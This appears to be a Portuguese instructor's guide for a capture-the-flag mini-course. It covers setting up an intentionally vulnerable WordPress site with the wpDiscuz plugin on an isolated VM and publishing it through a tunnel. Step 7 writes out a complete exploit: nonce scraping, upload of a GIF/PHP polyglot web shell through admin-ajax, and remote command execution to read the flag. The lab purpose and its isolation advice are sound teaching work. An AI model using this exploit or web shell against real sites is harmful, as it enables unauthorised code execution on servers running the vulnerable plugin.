# Guia do Palestrante — Preparar o alvo WordPress (VM local + túnel)

> Objetivo: rodar **um único** servidor WordPress vulnerável numa **VM local** e publicá-lo com um
> **túnel** para que os participantes acessem **apenas por uma URL** — sem instalar Docker em cada máquina.
>
> **Faça tudo isto ANTES do minicurso** e teste o exploit você mesmo até o fim.

## Arquitetura
```
[Participantes / navegador+Burp]  --https-->  [Túnel público]  -->  [VM local: Docker (WordPress:8080)]
```

## ⚠️ Segurança (leia primeiro)
Este alvo tem **RCE** de propósito. Ao publicá-lo:
- Use uma **VM descartável e isolada**, sem dados pessoais. Tire um **snapshot** antes.
- **Derrube o túnel e a VM logo após** o minicurso.
- Se possível, prefira **túnel** (não abre portas do seu roteador) e mantenha o evento curto.
- Opcional: proteja com **basic-auth** no túnel/reverse-proxy e passe a senha só à turma.

---

## Passo 1 — Criar a VM local
Use VirtualBox, Hyper-V ou similar. Sugestão: **Ubuntu Server 22.04+**, 2 vCPU, 4 GB RAM, 20 GB disco.
- Rede em **NAT** já basta (o túnel sai da própria VM; não precisa de IP público nem port forwarding).
- Habilite acesso ao terminal (console ou SSH).

## Passo 2 — Instalar o Docker na VM
```bash
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker $USER   # depois faça logout/login para valer
docker --version && docker compose version
```

## Passo 3 — Copiar o repositório para a VM
Leve a pasta `CTF-Secomp-2025-main` para a VM (git clone, scp, pen drive, etc.):
```bash
cd CTF-Secomp-2025-main/wordpress
ls docker-compose.hosted.yml Dockerfile flag   # confirme que estão aqui
```

## Passo 4 — Subir o alvo
```bash
docker compose -f docker-compose.hosted.yml up -d --build
# testa localmente dentro da VM:
curl -I http://localhost:8080
```
> O `docker-compose.hosted.yml` já ajusta a URL do WordPress dinamicamente (WP_HOME/WP_SITEURL a partir
> do host acessado) e usa volume de banco, então a configuração sobrevive a reinícios do container.

## Passo 5 — Publicar com um túnel
Escolha **um**. Rode **dentro da VM**, apontando para `http://localhost:8080`.

**Opção A — Cloudflare Tunnel (rápido, gratuito, sem cadastro para URL efêmera):**
```bash
# instalar cloudflared (Linux amd64)
curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x cloudflared && sudo mv cloudflared /usr/local/bin/
# publicar
cloudflared tunnel --url http://localhost:8080
# -> imprime uma URL https://XXXX.trycloudflare.com  (essa é a URL ALVO dos participantes)
```
> A URL efêmera **muda** se você reiniciar o túnel. Para uma URL **fixa** (recomendado se você tiver um
> domínio no Cloudflare), configure um *named tunnel* com hostname próprio e deixe rodando.

**Opção B — ngrok:**
```bash
# instale o ngrok e autentique (ngrok config add-authtoken <token>), depois:
ngrok http 8080
# -> use a URL https://XXXX.ngrok-free.app
```

**Guarde a URL pública — ela é o `ALVO` que você entrega aos participantes.**

## Passo 6 — Configurar o WordPress (uma vez)
Acesse a **URL pública (ALVO)** no seu navegador e:
1. Complete o **assistente do WordPress** (idioma, título, usuário admin/senha, e-mail).
   > Faça isso **pela URL do túnel**, não por `localhost`, para o site nascer com a URL certa.
2. **Plugins → Ativar** o **wpDiscuz**.
3. **wpDiscuz → Settings** → seção de **upload/anexos**: ligue
   **"anexos de imagem"** e **"permitir que visitantes (guests) enviem arquivos"** (`wmuIsGuestAllowed`). Salve.
4. **wpDiscuz → Settings → Comment Thread Displaying → "Comment List Loading Type" → selecione "Load with page"** e salve.
   > Sem isso o wpDiscuz carrega os comentários por AJAX ("lazy load") e o nonce **não** aparece no HTML cru —
   > o navegador funciona (tem JS), mas o teste por `curl` falha. No fluxo navegador + Burp isso não atrapalha.
5. Garanta um **post com comentários abertos** (o "Olá, mundo!" padrão já serve). Abra o post e confirme
   que o formulário do wpDiscuz aparece com o botão de anexo.

## Passo 7 — Testar o exploit (validação de ponta a ponta)
Rode de qualquer máquina (troque `ALVO`). Pegue o nonce e faça o upload:
```bash
ALVO="https://XXXX.trycloudflare.com"

# 1) pega o NONCE de upload.
#    ATENÇÃO: o wpDiscuz expõe o nonce num objeto JS (wpdiscuzAjaxObj.wmuSecurity),
#    NÃO num <input name="wmu_nonce">. E use -L (o ?p=1 redireciona para o link bonito).
NONCE=$(curl -sL "$ALVO/?p=1" | grep -oE '"wmuSecurity":"[a-f0-9]+"' | grep -oE '[a-f0-9]{10}' | head -1)
echo "nonce=[$NONCE]"   # se vier vazio, veja "Problemas comuns"

# 2) cria o polyglot (imagem + PHP) e envia como shell.php
printf 'GIF89a\n<?php system($_GET["c"]); ?>\n' > shell.php
curl -s "$ALVO/wp-admin/admin-ajax.php" \
  -F "action=wmuUploadFiles" -F "wmu_nonce=$NONCE" -F "postId=1" \
  -F "wmu_files[]=@shell.php;type=image/gif;filename=shell.php"
# -> a resposta JSON traz a URL em wp-content/uploads/AAAA/MM/shell-<numeros>.php

# 3) executa e lê a flag (troque pela URL EXATA do JSON, com ano/mês corretos)
curl "$ALVO/wp-content/uploads/AAAA/MM/shell-<numeros>.php?c=cat%20/flag"
# esperado: SECOMPwn25{|)0n't_u$3_outdat3|)_plug1n_1n_y0ur_0utd@t3d_wor|)pres$_duuh!}
```
Se a flag aparecer, está tudo certo. **Apague o `shell.php` de teste** (via `?c=rm ...`) se quiser começar limpo.

---

## Durante o evento — reset rápido
Se alguém "quebrar" o site:
```bash
docker compose -f docker-compose.hosted.yml restart web        # reinício leve (mantém a config)
# ou, do zero (apaga o banco e refaz o assistente):
docker compose -f docker-compose.hosted.yml down -v && docker compose -f docker-compose.hosted.yml up -d --build
```

## Encerrar
```bash
# parar o túnel: Ctrl+C na janela do cloudflared/ngrok
docker compose -f docker-compose.hosted.yml down -v
```
E **desligue/descarte a VM** (ou restaure o snapshot).

---

## Checklist final
- [ ] VM subindo, Docker OK (`docker compose version`).
- [ ] `docker compose -f docker-compose.hosted.yml up -d --build` rodando; `curl -I http://localhost:8080` = 200/302.
- [ ] Túnel ativo e URL pública anotada (**ALVO**).
- [ ] WordPress instalado **pela URL do túnel**.
- [ ] wpDiscuz **ativado**, **upload de visitante ligado** e **Comment List Loading Type = "Load with page"**.
- [ ] Post com comentários abertos existe.
- [ ] Você **testou o exploit** e leu a flag pela URL pública.
- [ ] Snapshot da VM tirado.

## O que entregar aos participantes
1. O arquivo **`RiceCat.gif`**.
2. A **URL do alvo (ALVO)**.
3. O guia **`MINICURSO.md`** (passos do participante).

---

## Problemas comuns
| Sintoma | Causa provável | Solução |
|--------|----------------|---------|
| Redirect para `localhost` / layout quebrado | WP instalado por `localhost` e não pela URL do túnel | Refaça a instalação pela URL do túnel (`down -v` e recomeçar) |
| Upload responde `msgUploadingNotAllowed` | Upload de visitante desligado | wpDiscuz → Settings → ligar anexos + guests |
| Resposta `-1` no upload | nonce vazio/incorreto | O nonce é o `wmuSecurity` (objeto JS), não um input `wmu_nonce`; use `curl -sL` e extraia o `wmuSecurity` (ver Passo 7) |
| `grep` do nonce retorna 0 | (a) `curl` sem `-L` pegou só o redirect; (b) "lazy load" ligado | Use `curl -sL`; e ligue **Comment List Loading Type → Load with page** |
| URL do túnel mudou | Túnel efêmero reiniciado | Reabrir túnel e (se preciso) reinstalar WP pela nova URL, ou usar named tunnel/domínio fixo |
| Porta 8080 ocupada na VM | Outro serviço usando 8080 | Trocar mapeamento no compose (ex.: `"8090:80"`) e apontar o túnel para 8090 |
